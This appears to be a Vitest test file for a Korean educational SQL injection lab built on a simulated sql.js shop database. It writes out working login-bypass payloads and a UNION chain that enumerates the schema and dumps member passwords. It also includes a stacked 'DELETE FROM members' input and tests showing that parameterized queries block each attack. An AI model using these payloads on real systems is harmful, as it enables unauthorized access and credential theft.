import { beforeAll, beforeEach, describe, expect, it } from 'vitest';
import initSqlJs from 'sql.js';
import { ADMIN, createShopDb } from './labDb.js';
import { errorHint, runQuery } from './query.js';
import { FORM_MISSIONS, attemptLogin, isBypass } from './formLab.js';
import { UNION_MISSIONS, hasInjectedRows, search } from './unionLab.js';

let SQL;
let db;
beforeAll(async () => {
  SQL = await initSqlJs();
});
beforeEach(() => {
  db = createShopDb(SQL);
});

const done = (missions, attempt) => missions.filter((m) => m.check(attempt)).map((m) => m.id);

describe('runQuery', () => {
  it('한 문장만 실행하고 여러 문장은 거부', () => {
    expect(runQuery(db, 'SELECT 1').rows).toEqual([[1]]);
    const r = runQuery(db, "SELECT 1; DELETE FROM members");
    expect(r.error).toMatch(/한 번에 한 문장/);
    expect(runQuery(db, 'SELECT count(*) FROM members').rows).toEqual([[4]]);
  });

  it('주석으로 끝나는 문장은 한 문장', () => {
    expect(runQuery(db, "SELECT 1 -- '; DROP TABLE members").error).toBeNull();
  });

  it('MySQL 흉내: information_schema, database(), version()', () => {
    const r = runQuery(db, "SELECT table_name FROM information_schema.tables WHERE table_schema = database() ORDER BY 1");
    expect(r.rows).toEqual([['members'], ['posts']]);
    expect(runQuery(db, 'SELECT version(), user()').error).toBeNull();
  });

  it('# 주석 안내', () => {
    const r = runQuery(db, "SELECT 1 #");
    expect(errorHint(r.error)).toMatch(/-- 로/);
  });
});

describe('Form SQL 인젝션', () => {
  it('정상 로그인은 인증 우회가 아님', () => {
    const a = attemptLogin(db, 'lee', 'lee2026^^');
    expect(a.user.username).toBe('lee');
    expect(isBypass(a)).toBe(false);
    expect(done(FORM_MISSIONS, a)).toEqual([]);
  });

  it('틀린 비밀번호는 실패', () => {
    expect(attemptLogin(db, 'admin', 'x').user).toBeNull();
  });

  it("' 하나로 SQL 오류", () => {
    const a = attemptLogin(db, "'", '');
    expect(a.error).toBeTruthy();
    expect(done(FORM_MISSIONS, a)).toEqual(['error']);
  });

  it("' OR '1'='1' -- → 첫 번째 회원(kim)", () => {
    const a = attemptLogin(db, "' OR '1'='1' --", 'x');
    expect(a.user.username).toBe('kim');
    expect(done(FORM_MISSIONS, a)).toEqual(['bypass']);
  });

  it('비밀번호 칸으로도 우회', () => {
    const a = attemptLogin(db, 'admin', "' OR '1'='1");
    expect(a.user).not.toBeNull();
    expect(isBypass(a)).toBe(true);
  });

  it("admin' -- → 관리자", () => {
    const a = attemptLogin(db, "admin' --", '');
    expect(a.user.role).toBe('admin');
    expect(done(FORM_MISSIONS, a)).toEqual(['bypass', 'admin']);
  });

  it("role 조건으로 관리자", () => {
    const a = attemptLogin(db, "' OR role = 'admin' --", '');
    expect(a.user.username).toBe('admin');
  });

  it('보안 코딩: 같은 입력이 값으로만 쓰여 로그인 실패', () => {
    const a = attemptLogin(db, "admin' --", '', { safe: true });
    expect(a.error).toBeNull();
    expect(a.user).toBeNull();
    expect(a.sql).not.toContain('admin');
    expect(done(FORM_MISSIONS, a)).toEqual(['safe']);
    expect(attemptLogin(db, 'admin', ADMIN.password, { safe: true }).user.username).toBe('admin');
  });
});

describe('Union SQL 인젝션', () => {
  it('정상 검색', () => {
    const a = search(db, '배송');
    expect(a.rows.map((r) => r[0])).toEqual([5, 1]);
    expect(hasInjectedRows(a)).toBe(false);
    expect(done(UNION_MISSIONS, a)).toEqual([]);
  });

  it("' → 오류, ORDER BY 로 컬럼 수", () => {
    expect(done(UNION_MISSIONS, search(db, "'"))).toEqual(['error']);
    expect(search(db, "' ORDER BY 4 --").error).toBeNull();
    const a = search(db, "' ORDER BY 5 --");
    expect(errorHint(a.error)).toMatch(/ORDER BY/);
  });

  it('컬럼 수가 틀리면 UNION 오류', () => {
    const a = search(db, "' UNION SELECT 1, 2, 3 --");
    expect(errorHint(a.error)).toMatch(/컬럼 수/);
  });

  it('UNION SELECT 1,2,3,4', () => {
    const a = search(db, "' UNION SELECT 1, 2, 3, 4 --");
    expect(done(UNION_MISSIONS, a)).toEqual(['columns']);
  });

  it('DB 정보 → 테이블 → 컬럼 → 관리자 비밀번호', () => {
    expect(done(UNION_MISSIONS, search(db, "' UNION SELECT 1, database(), version(), user() --"))).toEqual(['columns', 'dbinfo']);
    expect(done(UNION_MISSIONS, search(db, "' UNION SELECT 1, table_name, table_schema, 4 FROM information_schema.tables --")))
      .toEqual(['columns', 'dbinfo', 'tables']);
    expect(
      done(UNION_MISSIONS, search(db, "' UNION SELECT 1, column_name, data_type, 4 FROM information_schema.columns WHERE table_name = 'members' --")),
    ).toEqual(['columns', 'columns-name']);
    const dump = search(db, "' UNION SELECT id, username, password, role FROM members --");
    expect(done(UNION_MISSIONS, dump)).toEqual(['columns', 'dump']);
  });

  it('sqlite_master 로도 테이블 이름', () => {
    const a = search(db, "' UNION SELECT 1, name, type, 4 FROM sqlite_master --");
    expect(done(UNION_MISSIONS, a)).toContain('tables');
  });

  it('세미콜론으로 다른 문장을 이어 실행할 수 없음', () => {
    const a = search(db, "'; DELETE FROM members; --");
    expect(a.error).toMatch(/한 번에 한 문장/);
    expect(runQuery(db, 'SELECT count(*) FROM members').rows).toEqual([[4]]);
  });

  it('보안 코딩: UNION 이 문자열로만 검색됨', () => {
    const a = search(db, "' UNION SELECT id, username, password, role FROM members --", { safe: true });
    expect(a.error).toBeNull();
    expect(a.rows).toEqual([]);
    expect(done(UNION_MISSIONS, a)).toEqual(['safe']);
  });
});
